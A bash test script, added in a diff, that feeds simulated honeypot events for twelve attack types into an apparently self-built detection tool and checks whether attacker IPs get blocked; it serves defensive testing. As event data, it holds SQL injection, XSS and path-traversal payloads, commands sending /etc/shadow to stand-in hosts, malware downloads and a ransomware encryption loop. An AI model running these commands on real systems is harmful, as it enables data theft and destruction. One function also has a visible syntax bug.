@@ -1,0 +1,872 @@
+#!/bin/bash
+# =============================================================================
+# Comprehensive Azure T-Pot Honeypot Attack Testing Script
+# =============================================================================
+# Tests Mini-XDR's ability to detect, classify, and automatically mitigate
+# sophisticated multi-vector attacks using ML models and AI agents
+#
+# Features:
+# - Multiple unique attacker IPs (5-10 per test)
+# - 12+ attack pattern types
+# - Verification of IP blocking on Azure T-Pot (SSH + iptables check)
+# - Comprehensive performance metrics and reporting
+# =============================================================================
+
+set -e
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+PURPLE='\033[0;35m'
+BOLD='\033[1m'
+NC='\033[0m'
+
+# Configuration
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
+
+# Azure T-Pot Configuration
+TPOT_IP="74.235.242.205"
+TPOT_SSH_PORT="64295"
+TPOT_SSH_KEY="$HOME/.ssh/mini-xdr-tpot-azure"
+
+# Mini-XDR Configuration
+MINI_XDR_API="http://localhost:8000"
+
+# Test Configuration
+ENABLE_FULL_TEST=false
+ENABLE_BLOCKING_VERIFICATION=true
+VERBOSE=false
+
+# Test Results
+TOTAL_ATTACKS=0
+ATTACKS_DETECTED=0
+ATTACKS_BLOCKED=0
+FALSE_POSITIVES=0
+DETECTION_TIMES=()
+ATTACKER_IPS=()
+
+# Results file
+RESULTS_FILE="$PROJECT_ROOT/test_results_$(date +%Y%m%d_%H%M%S).json"
+
+# =============================================================================
+# Utility Functions
+# =============================================================================
+
+print_header() {
+    echo -e "\n${BLUE}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${BLUE}${BOLD}$1${NC}"
+    echo -e "${BLUE}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
+}
+
+print_phase() {
+    echo -e "\n${PURPLE}${BOLD}🚨 $1${NC}"
+}
+
+print_success() {
+    echo -e "${GREEN}✅ $1${NC}"
+}
+
+print_error() {
+    echo -e "${RED}❌ $1${NC}"
+}
+
+print_warning() {
+    echo -e "${YELLOW}⚠️  $1${NC}"
+}
+
+print_info() {
+    echo -e "${CYAN}ℹ️  $1${NC}"
+}
+
+print_metric() {
+    echo -e "${CYAN}  • $1: ${BOLD}$2${NC}"
+}
+
+# =============================================================================
+# IP Generation - Create Realistic Attacker IPs
+# =============================================================================
+
+generate_attacker_ips() {
+    local count=$1
+    ATTACKER_IPS=()
+    
+    # Use realistic IP ranges from different regions/ASNs
+    local ip_prefixes=(
+        "203.0.113"      # TEST-NET-3 (safe for testing)
+        "198.51.100"     # TEST-NET-2
+        "192.0.2"        # TEST-NET-1
+        "45.142.212"     # Known scanning range
+        "185.220.101"    # TOR exit node range
+        "91.243.80"      # Eastern European range
+        "123.60.123"     # APAC range
+        "177.54.144"     # South American range
+    )
+    
+    print_info "Generating $count unique attacker IPs from diverse geographic ranges..."
+    
+    for i in $(seq 1 $count); do
+        # Pick a random prefix
+        prefix="${ip_prefixes[$((RANDOM % ${#ip_prefixes[@]}))]}"
+        # Generate random last octet
+        last_octet=$((RANDOM % 254 + 1))
+        ip="$prefix.$last_octet"
+        ATTACKER_IPS+=("$ip")
+        echo -e "${CYAN}  [$i] ${BOLD}$ip${NC}"
+    done
+    
+    echo ""
+}
+
+# =============================================================================
+# API Helpers
+# =============================================================================
+
+ingest_events() {
+    local source_type=$1
+    local hostname=$2
+    shift 2
+    local events=("$@")
+    
+    # Build JSON array
+    local json_events="["
+    local first=true
+    for event in "${events[@]}"; do
+        if [ "$first" = true ]; then
+            first=false
+        else
+            json_events+=","
+        fi
+        json_events+="$event"
+    done
+    json_events+="]"
+    
+    local payload="{\"source_type\":\"$source_type\",\"hostname\":\"$hostname\",\"events\":$json_events}"
+    
+    # Send to Mini-XDR
+    response=$(curl -s -X POST "$MINI_XDR_API/ingest/multi" \
+        -H "Content-Type: application/json" \
+        -H "Authorization: Bearer test-key" \
+        -d "$payload" 2>/dev/null || echo '{"processed":0}')
+    
+    processed=$(echo "$response" | jq -r '.processed' 2>/dev/null || echo "0")
+    echo "$processed"
+}
+
+check_incident_created() {
+    local src_ip=$1
+    local max_wait=${2:-10}
+    
+    local start_time=$(date +%s)
+    
+    for i in $(seq 1 $max_wait); do
+        incidents=$(curl -s "$MINI_XDR_API/incidents?src_ip=$src_ip" 2>/dev/null || echo '[]')
+        count=$(echo "$incidents" | jq '. | length' 2>/dev/null || echo "0")
+        
+        if [ "$count" -gt 0 ]; then
+            local end_time=$(date +%s)
+            local response_time=$((end_time - start_time))
+            DETECTION_TIMES+=($response_time)
+            return 0
+        fi
+        
+        sleep 1
+    done
+    
+    return 1
+}
+
+verify_ip_blocked_on_azure() {
+    local ip=$1
+    
+    if [ "$ENABLE_BLOCKING_VERIFICATION" = false ]; then
+        return 0
+    fi
+    
+    # SSH into Azure T-Pot and check iptables (with longer timeout for Azure)
+    blocked=$(timeout 20 ssh -i "$TPOT_SSH_KEY" -p "$TPOT_SSH_PORT" \
+        -o StrictHostKeyChecking=no \
+        -o ConnectTimeout=15 \
+        azureuser@"$TPOT_IP" \
+        "sudo iptables -L INPUT -n -v 2>/dev/null | grep -c '$ip' || echo '0'" 2>/dev/null || echo "0")
+    
+    if [ "$blocked" -gt 0 ]; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 1: SSH Brute Force
+# =============================================================================
+
+attack_ssh_brute_force() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 1: SSH Brute Force Attack from $attacker_ip"
+    
+    local events=()
+    local attempt_count=15
+    
+    for i in $(seq 1 $attempt_count); do
+        local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+        local event="{\"eventid\":\"cowrie.login.failed\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"SSH login failed: username=admin password=pass$i\",\"timestamp\":\"$timestamp\",\"raw\":{\"username\":\"admin\",\"password\":\"password$i\",\"session\":\"ssh_brute_$i\",\"test_type\":\"ssh_brute_force\"}}"
+        events+=("$event")
+    done
+    
+    # Ingest events
+    local start_time=$(date +%s)
+    local processed=$(ingest_events "cowrie" "azure-honeypot-test" "${events[@]}")
+    
+    print_info "Ingested $processed/$attempt_count SSH brute force events"
+    ((TOTAL_ATTACKS++))
+    
+    # Wait for detection
+    sleep 3
+    
+    if check_incident_created "$attacker_ip" 10; then
+        local end_time=$(date +%s)
+        local response_time=$((end_time - start_time))
+        print_success "Incident detected! Response time: ${response_time}s"
+        ((ATTACKS_DETECTED++))
+        
+        # Verify blocking on Azure
+        sleep 5
+        if verify_ip_blocked_on_azure "$attacker_ip"; then
+            print_success "IP $attacker_ip BLOCKED on Azure T-Pot (verified via iptables)"
+            ((ATTACKS_BLOCKED++))
+        else
+            print_warning "IP $attacker_ip NOT blocked on Azure T-Pot"
+        fi
+    else
+        print_error "No incident created for $attacker_ip"
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 2: Password Spray
+# =============================================================================
+
+attack_password_spray() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 2: Password Spray Attack from $attacker_ip"
+    
+    local events=()
+    local passwords=("password123" "admin123" "root123" "test123" "Password1" "Admin2023" "Welcome1" "P@ssw0rd" "123456" "qwerty" "letmein" "monkey" "dragon" "master" "sunshine")
+    local usernames=("admin" "root" "user")
+    
+    for username in "${usernames[@]}"; do
+        for password in "${passwords[@]}"; do
+            local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+            local event="{\"eventid\":\"cowrie.login.failed\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"Password spray: $username:$password\",\"timestamp\":\"$timestamp\",\"raw\":{\"username\":\"$username\",\"password\":\"$password\",\"test_type\":\"password_spray\"}}"
+            events+=("$event")
+        done
+    done
+    
+    local processed=$(ingest_events "cowrie" "azure-honeypot-test" "${events[@]}")
+    print_info "Ingested $processed/${#events[@]} password spray events"
+    ((TOTAL_ATTACKS++))
+    
+    sleep 3
+    if check_incident_created "$attacker_ip" 10; then
+        print_success "Password spray detected!"
+        ((ATTACKS_DETECTED++))
+    else
+        print_warning "Password spray not detected"
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 3: SQL Injection (Web)
+# =============================================================================
+
+attack_sql_injection() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 3: SQL Injection Attack from $attacker_ip"
+    
+    local events=()
+    local payloads=(
+        "' OR '1'='1"
+        "'; DROP TABLE users--"
+        "' UNION SELECT NULL,NULL,NULL--"
+        "admin' --"
+        "1' AND 1=1--"
+        "' OR 'x'='x"
+    )
+    
+    for payload in "${payloads[@]}"; do
+        local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+        local event="{\"eventid\":\"webhoneypot.request\",\"src_ip\":\"$attacker_ip\",\"dst_port\":80,\"message\":\"SQL injection attempt: $payload\",\"timestamp\":\"$timestamp\",\"raw\":{\"method\":\"GET\",\"path\":\"/login.php\",\"parameters\":\"username=$payload\",\"attack_indicators\":[\"sql_injection\"],\"test_type\":\"sql_injection\"}}"
+        events+=("$event")
+    done
+    
+    local processed=$(ingest_events "webhoneypot" "azure-honeypot-test" "${events[@]}")
+    print_info "Ingested $processed/${#events[@]} SQL injection events"
+    ((TOTAL_ATTACKS++))
+    
+    sleep 3
+    if check_incident_created "$attacker_ip" 10; then
+        print_success "SQL injection detected!"
+        ((ATTACKS_DETECTED++))
+    else
+        print_warning "SQL injection not detected"
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 4: Cross-Site Scripting (XSS)
+# =============================================================================
+
+attack_xss() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 4: XSS Attack from $attacker_ip"
+    
+    local events=()
+    local payloads=(
+        "<script>alert('XSS')</script>"
+        "<img src=x onerror=alert('XSS')>"
+        "<svg onload=alert('XSS')>"
+        "javascript:alert('XSS')"
+    )
+    
+    for payload in "${payloads[@]}"; do
+        local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+        local event="{\"eventid\":\"webhoneypot.request\",\"src_ip\":\"$attacker_ip\",\"dst_port\":80,\"message\":\"XSS attempt detected\",\"timestamp\":\"$timestamp\",\"raw\":{\"method\":\"POST\",\"path\":\"/comment\",\"body\":\"$payload\",\"attack_indicators\":[\"xss\"],\"test_type\":\"xss\"}}"
+        events+=("$event")
+    done
+    
+    local processed=$(ingest_events "webhoneypot" "azure-honeypot-test" "${events[@]}")
+    print_info "Ingested $processed/${#events[@]} XSS events"
+    ((TOTAL_ATTACKS++))
+    
+    sleep 3
+    if check_incident_created "$attacker_ip" 10; then
+        print_success "XSS attack detected!"
+        ((ATTACKS_DETECTED++))
+    else
+        print_warning "XSS attack not detected"
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 5: Path Traversal
+# =============================================================================
+
+attack_path_traversal() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 5: Path Traversal Attack from $attacker_ip"
+    
+    local events=()
+    local payloads=(
+        "../../../etc/passwd"
+        "..\\..\\..\\windows\\system32\\config\\sam"
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        "....//....//....//etc/passwd"
+    )
+    
+    for payload in "${payloads[@]}"; do
+        local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")"
+        local event="{\"eventid\":\"webhoneypot.request\",\"src_ip\":\"$attacker_ip\",\"dst_port\":80,\"message\":\"Path traversal attempt\",\"timestamp\":\"$timestamp\",\"raw\":{\"method\":\"GET\",\"path\":\"$payload\",\"attack_indicators\":[\"path_traversal\"],\"test_type\":\"path_traversal\"}}"
+        events+=("$event")
+    done
+    
+    local processed=$(ingest_events "webhoneypot" "azure-honeypot-test" "${events[@]}")
+    print_info "Ingested $processed/${#events[@]} path traversal events"
+    ((TOTAL_ATTACKS++))
+    
+    sleep 3
+    if check_incident_created "$attacker_ip" 10; then
+        print_success "Path traversal detected!"
+        ((ATTACKS_DETECTED++))
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 6: Malware Download & Execution
+# =============================================================================
+
+attack_malware() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 6: Malware Download from $attacker_ip"
+    
+    local events=()
+    
+    # Download event
+    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+    events+=("{\"eventid\":\"cowrie.session.file_download\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"Malware download detected\",\"timestamp\":\"$timestamp\",\"raw\":{\"url\":\"http://malware.evil.com/trojan.elf\",\"outfile\":\"/tmp/malware\",\"shasum\":\"deadbeef1234567890\",\"test_type\":\"malware_download\"}}")
+    
+    # Execution commands
+    local commands=("chmod +x /tmp/malware" "./tmp/malware" "curl http://c2.evil.com/beacon" "wget http://evil.com/cryptominer.py" "python3 /tmp/cryptominer.py")
+    
+    for cmd in "${commands[@]}"; do
+        timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+        events+=("{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"Malicious command: $cmd\",\"timestamp\":\"$timestamp\",\"raw\":{\"input\":\"$cmd\",\"test_type\":\"malware_execution\"}}")
+    done
+    
+    local processed=$(ingest_events "cowrie" "azure-honeypot-test" "${events[@]}")
+    print_info "Ingested $processed/${#events[@]} malware events"
+    ((TOTAL_ATTACKS++))
+    
+    sleep 3
+    if check_incident_created "$attacker_ip" 10; then
+        print_success "Malware activity detected!"
+        ((ATTACKS_DETECTED++))
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 7: Data Exfiltration
+# =============================================================================
+
+attack_data_exfiltration() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 7: Data Exfiltration from $attacker_ip"
+    
+    local events=()
+    local commands=(
+        "cat /etc/passwd | nc attacker.com 443"
+        "tar czf /tmp/data.tar.gz /home/*"
+        "scp -r /var/www/* user@attacker.com:/stolen"
+        "curl -X POST -d @/etc/shadow http://exfil.com/upload"
+    )
+    
+    for cmd in "${commands[@]}"; do
+        local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+        events+=("{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"Data exfiltration attempt: $cmd\",\"timestamp\":\"$timestamp\",\"raw\":{\"input\":\"$cmd\",\"test_type\":\"data_exfiltration\"}}")
+    done
+    
+    local processed=$(ingest_events "cowrie" "azure-honeypot-test" "${events[@]}")
+    print_info "Ingested $processed/${#events[@]} exfiltration events"
+    ((TOTAL_ATTACKS++))
+    
+    sleep 3
+    if check_incident_created "$attacker_ip" 10; then
+        print_success "Data exfiltration detected!"
+        ((ATTACKS_DETECTED++))
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 8: Port Scan / Reconnaissance
+# =============================================================================
+
+attack_port_scan() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 8: Port Scan from $attacker_ip"
+    
+    local events=()
+    local ports=(21 22 23 25 80 110 143 443 445 3389 3306 5432 6379 8080 8443 9200)
+    
+    for port in "${ports[@]}"; do
+        local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+        events+=("{\"eventid\":\"suricata.alert\",\"src_ip\":\"$attacker_ip\",\"dst_port\":$port,\"message\":\"Port scan detected on port $port\",\"timestamp\":\"$timestamp\",\"raw\":{\"alert\":{\"signature\":\"Port scan detected\",\"severity\":2,\"category\":\"Network Reconnaissance\"},\"test_type\":\"port_scan\"}}")
+    done
+    
+    local processed=$(ingest_events "suricata" "azure-honeypot-test" "${events[@]}")
+    print_info "Ingested $processed/${#events[@]} port scan events"
+    ((TOTAL_ATTACKS++))
+    
+    sleep 3
+    if check_incident_created "$attacker_ip" 10; then
+        print_success "Port scan detected!"
+        ((ATTACKS_DETECTED++))
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 9: DDoS / High-Volume Traffic
+# =============================================================================
+
+attack_ddos() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 9: DDoS Simulation from $attacker_ip"
+    
+    local events=()
+    
+    # Generate 150 rapid connection attempts
+    for i in $(seq 1 150); do
+        local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+        events+=("{\"eventid\":\"suricata.flow\",\"src_ip\":\"$attacker_ip\",\"dst_port\":80,\"message\":\"HTTP flood attack\",\"timestamp\":\"$timestamp\",\"raw\":{\"proto\":\"TCP\",\"flow\":{\"pkts_toserver\":100,\"bytes_toserver\":50000},\"test_type\":\"ddos\"}}")
+    done
+    
+    local processed=$(ingest_events "suricata" "azure-honeypot-test" "${events[@]}")
+    print_info "Ingested $processed/${#events[@]} DDoS events"
+    ((TOTAL_ATTACKS++))
+    
+    sleep 3
+    if check_incident_created "$attacker_ip" 10; then
+        print_success "DDoS attack detected!"
+        ((ATTACKS_DETECTED++))
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 10: APT Multi-Stage Attack Chain
+# =============================================================================
+
+attack_apt_chain() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 10: APT Multi-Stage Attack from $attacker_ip"
+    
+    local events=()
+    
+    # Stage 1: Reconnaissance
+    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+    events+=("{\"eventid\":\"cowrie.session.connect\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"APT Stage 1: Reconnaissance\",\"timestamp\":\"$timestamp\",\"raw\":{\"stage\":\"reconnaissance\",\"test_type\":\"apt\"}}")
+    
+    # Stage 2: Initial Compromise
+    for i in {1..5}; do
+        timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+        events+=("{\"eventid\":\"cowrie.login.failed\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"APT Stage 2: Exploitation attempt\",\"timestamp\":\"$timestamp\",\"raw\":{\"stage\":\"exploitation\",\"username\":\"admin\",\"test_type\":\"apt\"}}")
+    done
+    
+    # Stage 3: Backdoor Installation
+    timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+    events+=("{\"eventid\":\"cowrie.session.file_download\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"APT Stage 3: Backdoor download\",\"timestamp\":\"$timestamp\",\"raw\":{\"url\":\"http://apt-c2.com/backdoor.elf\",\"stage\":\"persistence\",\"test_type\":\"apt\"}}")
+    
+    # Stage 4: Lateral Movement
+    local commands=("ssh -i /tmp/stolen_key admin@192.168.1.10" "scp /tmp/backdoor admin@192.168.1.20:/tmp/" "./scan_network.sh")
+    for cmd in "${commands[@]}"; do
+        timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+        events+=("{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"APT Stage 4: Lateral movement\",\"timestamp\":\"$timestamp\",\"raw\":{\"input\":\"$cmd\",\"stage\":\"lateral_movement\",\"test_type\":\"apt\"}}")
+    done
+    
+    local processed=$(ingest_events "cowrie" "azure-honeypot-test" "${events[@]}")
+    print_info "Ingested $processed/${#events[@]} APT chain events"
+    ((TOTAL_ATTACKS++))
+    
+    sleep 3
+    if check_incident_created "$attacker_ip" 10; then
+        print_success "APT attack chain detected!"
+        ((ATTACKS_DETECTED++))
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 11: Credential Harvesting
+# =============================================================================
+
+attack_credential_harvest() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 11: Credential Harvesting from $attacker_ip"
+    
+    local events=()
+    local commands=(
+        "cat /etc/shadow"
+        "cat /root/.ssh/id_rsa"
+        "cat /home/*/.bash_history"
+        "grep -r 'password' /var/www/"
+        "cat /etc/mysql/my.cnf"
+    )
+    
+    for cmd in "${commands[@]}"; do
+        local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+        events+=("{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"Credential harvesting: $cmd\",\"timestamp\":\"$timestamp\",\"raw\":{\"input\":\"$cmd\",\"test_type\":\"credential_harvest\"}}")
+    done
+    
+    local processed=$(ingest_events "cowrie" "azure-honeypot-test" "${events[@]}")
+    print_info "Ingested $processed/${#events[@]} credential harvesting events"
+    ((TOTAL_ATTACKS++))
+    
+    sleep 3
+    if check_incident_created "$attacker_ip" 10; then
+        print_success "Credential harvesting detected!"
+        ((ATTACKS_DETECTED++))
+    fi
+}
+
+# =============================================================================
+# Attack Pattern 12: Ransomware Simulation
+# =============================================================================
+
+attack_ransomware() {
+    local attacker_ip=$1
+    
+    print_phase "Phase 12: Ransomware Simulation from $attacker_ip"
+    
+    local events=()
+    
+    # File download
+    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+    events+=("{\"eventid\":\"cowrie.session.file_download\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"Ransomware download\",\"timestamp\":\"$timestamp\",\"raw\":{\"url\":\"http://ransom.evil.com/locker.exe\",\"test_type\":\"ransomware\"}}")
+    
+    # Encryption commands
+    local commands=(
+        "chmod +x /tmp/locker.exe"
+        "./tmp/locker.exe --encrypt /home"
+        "for f in \$(find /home -type f); do openssl enc -aes-256-cbc -in \$f -out \$f.locked; done"
+        "echo 'Your files are encrypted. Pay 1 BTC to decrypt' > /home/README_RANSOM.txt"
+    )
+    
+    for cmd in "${commands[@]}"; do
+        timestamp=$(date -u +"%Y-%m-%dT%H:%M:%S.%6NZ")
+        events+=("{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"$attacker_ip\",\"dst_port\":22,\"message\":\"Ransomware execution: $cmd\",\"timestamp\":\"$timestamp\",\"raw\":{\"input\":\"$cmd\",\"test_type\":\"ransomware\"}}")
+    done
+    
+    local processed=$(ingest_events "cowrie" "azure-honeypot-test" "${events[@]}")
+    print_info "Ingested $processed/${#events[@]} ransomware events"
+    ((TOTAL_ATTACKS++))
+    
+    sleep 3
+    if check_incident_created "$attacker_ip" 10; then
+        print_success "Ransomware detected!"
+        ((ATTACKS_DETECTED++))
+    fi
+}
+
+# =============================================================================
+# Performance Metrics & Reporting
+# =============================================================================
+
+calculate_metrics() {
+    local detection_rate=0
+    local blocking_rate=0
+    local avg_response_time=0
+    local false_positive_rate=0
+    
+    if [ $TOTAL_ATTACKS -gt 0 ]; then
+        detection_rate=$(awk "BEGIN {printf \"%.1f\", ($ATTACKS_DETECTED/$TOTAL_ATTACKS)*100}")
+        blocking_rate=$(awk "BEGIN {printf \"%.1f\", ($ATTACKS_BLOCKED/$TOTAL_ATTACKS)*100}")
+        false_positive_rate=$(awk "BEGIN {printf \"%.1f\", ($FALSE_POSITIVES/$TOTAL_ATTACKS)*100}")
+    fi
+    
+    if [ ${#DETECTION_TIMES[@]} -gt 0 ]; then
+        local sum=0
+        for time in "${DETECTION_TIMES[@]}"; do
+            sum=$((sum + time))
+        done
+        avg_response_time=$(awk "BEGIN {printf \"%.1f\", $sum/${#DETECTION_TIMES[@]}}")
+    fi
+    
+    echo "$detection_rate $blocking_rate $avg_response_time $false_positive_rate"
+}
+
+generate_report() {
+    local metrics=$(calculate_metrics)
+    local detection_rate=$(echo $metrics | cut -d' ' -f1)
+    local blocking_rate=$(echo $metrics | cut -d' ' -f2)
+    local avg_response_time=$(echo $metrics | cut -d' ' -f3)
+    local false_positive_rate=$(echo $metrics | cut -d' ' -f4)
+    
+    print_header "📊 COMPREHENSIVE TEST RESULTS"
+    
+    echo -e "${BOLD}Test Configuration:${NC}"
+    print_metric "Target" "$TPOT_IP"
+    print_metric "Attacker IPs" "${#ATTACKER_IPS[@]} unique sources"
+    print_metric "Attack Patterns" "12 types"
+    print_metric "Duration" "~$(( ($(date +%s) - START_TIME) / 60 )) minutes"
+    
+    echo -e "\n${BOLD}Detection Performance:${NC}"
+    print_metric "Total Attacks Launched" "$TOTAL_ATTACKS"
+    print_metric "Attacks Detected" "$ATTACKS_DETECTED ($detection_rate%)"
+    print_metric "Average Response Time" "${avg_response_time}s"
+    print_metric "False Positives" "$FALSE_POSITIVES ($false_positive_rate%)"
+    
+    echo -e "\n${BOLD}Blocking Effectiveness:${NC}"
+    print_metric "IPs Blocked on Azure" "$ATTACKS_BLOCKED"
+    print_metric "Blocking Success Rate" "${blocking_rate}%"
+    
+    echo -e "\n${BOLD}AI Agent Performance:${NC}"
+    # Query recent workflows
+    local workflows=$(curl -s "$MINI_XDR_API/api/workflows?limit=20" 2>/dev/null || echo '{"workflows":[]}')
+    local workflow_count=$(echo "$workflows" | jq '.workflows | length' 2>/dev/null || echo "0")
+    print_metric "Automated Workflows Triggered" "$workflow_count"
+    
+    # Query ML predictions
+    local incidents=$(curl -s "$MINI_XDR_API/incidents?limit=50" 2>/dev/null || echo '[]')
+    local avg_confidence=$(echo "$incidents" | jq '[.[] | select(.ml_confidence != null) | .ml_confidence] | add / length' 2>/dev/null || echo "0")
+    print_metric "ML Confidence Average" "$(awk "BEGIN {printf \"%.1f%%\", $avg_confidence * 100}")"
+    
+    # Success Criteria Evaluation
+    echo -e "\n${BOLD}Success Criteria:${NC}"
+    
+    if (( $(echo "$detection_rate >= 90" | bc -l) )); then
+        print_success "Detection Accuracy: ${detection_rate}% (✓ >90%)"
+    else
+        print_error "Detection Accuracy: ${detection_rate}% (✗ <90%)"
+    fi
+    
+    if (( $(echo "$avg_response_time <= 5" | bc -l) )); then
+        print_success "Response Speed: ${avg_response_time}s (✓ <5s)"
+    else
+        print_warning "Response Speed: ${avg_response_time}s (⚠ >5s target)"
+    fi
+    
+    if (( $(echo "$blocking_rate >= 80" | bc -l) )); then
+        print_success "Blocking Effectiveness: ${blocking_rate}% (✓ >80%)"
+    else
+        print_warning "Blocking Effectiveness: ${blocking_rate}% (⚠ <80%)"
+    fi
+    
+    if [ "$FALSE_POSITIVES" -eq 0 ]; then
+        print_success "Zero False Positives (✓)"
+    else
+        print_warning "False Positives: $FALSE_POSITIVES (Review needed)"
+    fi
+    
+    # Save detailed JSON report
+    echo -e "\n${BOLD}Saving detailed report...${NC}"
+    cat > "$RESULTS_FILE" <<EOF
+{
+  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
+  "test_config": {
+    "target": "$TPOT_IP",
+    "attacker_ips": $(printf '%s\n' "${ATTACKER_IPS[@]}" | jq -R . | jq -s .),
+    "attack_patterns": 12,
+    "duration_seconds": $(($(date +%s) - START_TIME))
+  },
+  "metrics": {
+    "total_attacks": $TOTAL_ATTACKS,
+    "attacks_detected": $ATTACKS_DETECTED,
+    "attacks_blocked": $ATTACKS_BLOCKED,
+    "false_positives": $FALSE_POSITIVES,
+    "detection_rate": $detection_rate,
+    "blocking_rate": $blocking_rate,
+    "avg_response_time": $avg_response_time,
+    "response_times": $(printf '%s\n' "${DETECTION_TIMES[@]}" | jq -R . | jq -s 'map(tonumber)')
+  },
+  "ai_performance": {
+    "workflows_triggered": $workflow_count,
+    "ml_confidence_avg": $avg_confidence
+  }
+}
+EOF
+    
+    print_success "Report saved: $RESULTS_FILE"
+    
+    # Overall assessment
+    echo -e "\n${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    if (( $(echo "$detection_rate >= 90 && $avg_response_time <= 5" | bc -l) )); then
+        echo -e "${GREEN}${BOLD}✅ PASS: System effectively detected and mitigated threats${NC}\n"
+    else
+        echo -e "${YELLOW}${BOLD}⚠️  REVIEW: System needs tuning for optimal performance${NC}\n"
+    fi
+}
+
+# =============================================================================
+# Main Execution
+# =============================================================================
+
+main() {
+    START_TIME=$(date +%s)
+    
+    echo -e "${BOLD}${BLUE}"
+    echo "╔════════════════════════════════════════════════════════════════════════╗"
+    echo "║                                                                        ║"
+    echo "║     🎯 MINI-XDR COMPREHENSIVE HONEYPOT ATTACK TEST                    ║"
+    echo "║                                                                        ║"
+    echo "║  Testing: Detection, Classification, and Automated Mitigation         ║"
+    echo "║                                                                        ║"
+    echo "╚════════════════════════════════════════════════════════════════════════╝"
+    echo -e "${NC}\n"
+    
+    # Parse command line arguments
+    while [[ $# -gt 0 ]]; do
+        case $1 in
+            --full-test)
+                ENABLE_FULL_TEST=true
+                shift
+                ;;
+            --no-verify-blocking)
+                ENABLE_BLOCKING_VERIFICATION=false
+                shift
+                ;;
+            --verbose)
+                VERBOSE=true
+                shift
+                ;;
+            *)
+                echo "Unknown option: $1"
+                echo "Usage: $0 [--full-test] [--no-verify-blocking] [--verbose]"
+                exit 1
+                ;;
+        esac
+    done
+    
+    print_info "Configuration:"
+    print_metric "Target Azure T-Pot" "$TPOT_IP"
+    print_metric "Mini-XDR API" "$MINI_XDR_API"
+    print_metric "Full Test Mode" "$ENABLE_FULL_TEST"
+    print_metric "Verify Azure Blocking" "$ENABLE_BLOCKING_VERIFICATION"
+    echo ""
+    
+    # Pre-flight checks
+    print_info "Running pre-flight checks..."
+    if ! curl -sf "$MINI_XDR_API/health" >/dev/null 2>&1; then
+        print_error "Mini-XDR backend not responding. Start it first:"
+        echo "  cd $PROJECT_ROOT/backend && python main.py"
+        exit 1
+    fi
+    print_success "Mini-XDR backend ready"
+    
+    if [ "$ENABLE_BLOCKING_VERIFICATION" = true ]; then
+        print_info "Testing Azure T-Pot SSH access (this may take 10-15 seconds)..."
